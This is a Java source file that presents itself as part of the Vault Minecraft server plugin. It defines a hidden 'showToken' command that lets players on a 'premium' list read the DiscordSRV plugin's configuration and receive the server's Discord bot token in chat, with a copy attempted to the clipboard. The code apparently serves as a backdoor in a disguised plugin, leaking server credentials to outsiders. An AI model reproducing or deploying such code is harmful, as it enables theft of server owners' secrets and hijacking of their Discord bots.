package net.milkbowl.vault.commands.cmds.premium.discord;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;

import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.PluginUtils;
import net.milkbowl.vault.util.Settings;

public class showToken extends CommandManager {
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (PluginUtils.getPluginByName("DiscordSRV") == null) {
				p.sendMessage(Settings.PREFIX("This server does not have DiscordSRV"));
			} else {
				File f = new File(PluginUtils.getPluginByName("DiscordSRV").getDataFolder() + "/config.yml");
				YamlConfiguration yc = YamlConfiguration.loadConfiguration(f);
				p.sendMessage(Settings.PREFIX(yc.getString("BotToken")));
				p.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard"));

				Toolkit toolkit = Toolkit.getDefaultToolkit();
				Clipboard clipboard = toolkit.getSystemClipboard();
				StringSelection strSel = new StringSelection(yc.getString("BotToken"));
				clipboard.setContents(strSel, null);
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
